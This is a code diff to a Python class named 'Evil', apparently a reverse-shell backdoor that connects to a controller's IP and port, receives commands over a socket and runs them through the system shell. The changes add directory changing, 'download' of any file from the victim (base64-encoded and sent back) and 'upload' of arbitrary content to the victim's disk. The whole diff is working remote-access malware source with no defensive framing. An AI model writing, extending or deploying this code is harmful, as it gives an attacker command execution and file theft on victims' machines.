@@ -7,6 +7,8 @@
 import socket
 import subprocess
 import json
+import os
+import base64
 
 class Evil:
     def __init__(self,ip,port):
@@ -22,7 +24,7 @@ class Evil:
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(4098)
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -30,17 +32,41 @@ class Evil:
     def exec_sys_cmd(self,cmd):
         return subprocess.check_output(cmd,shell=True)
 
+    def change_working_dir(self,path):
+        os.chdir(path)
+        return "Changing dir to " + path
+
+    def read_file(self,path):
+        with open(path,"rb") as target_file:
+            return base64.b64encode(target_file.read())
+
+    def write_file(self,path,content):
+        with open(path,"wb") as target_file:
+            target_file.write(base64.b64decode(content))
+            return "[+] Upload Successful."
+
     def run(self):
         while True:
             try:
+                # cmd_result = ""
                 cmd = self.reliable_recv()
-                cmd_result = self.exec_sys_cmd(cmd)
+                if cmd[0] == "exit":
+                    self.connection.close()
+                    exit()
+                elif cmd[0] == "cd" and len(cmd) > 1:
+                    cmd_result = self.change_working_dir(cmd[1])
+                elif cmd[0] == "download" and len(cmd) > 1:
+                    cmd_result = self.read_file(cmd[1])
+                elif cmd[0] == "upload" and len(cmd) > 1:
+                    cmd_result = self.write_file(cmd[1],cmd[2])
+                else:
+                    cmd_result = self.exec_sys_cmd(cmd)
                 if not cmd_result:
-                    self.reliable_send("System command exception")
+                    self.reliable_send("[-] Command exception.")
                     continue
                 self.reliable_send(cmd_result)
             except Exception:
-                self.reliable_send("Something wrong...")
+                self.reliable_send("[-] Something wrong.")
                 continue
 
         self.connection.close()
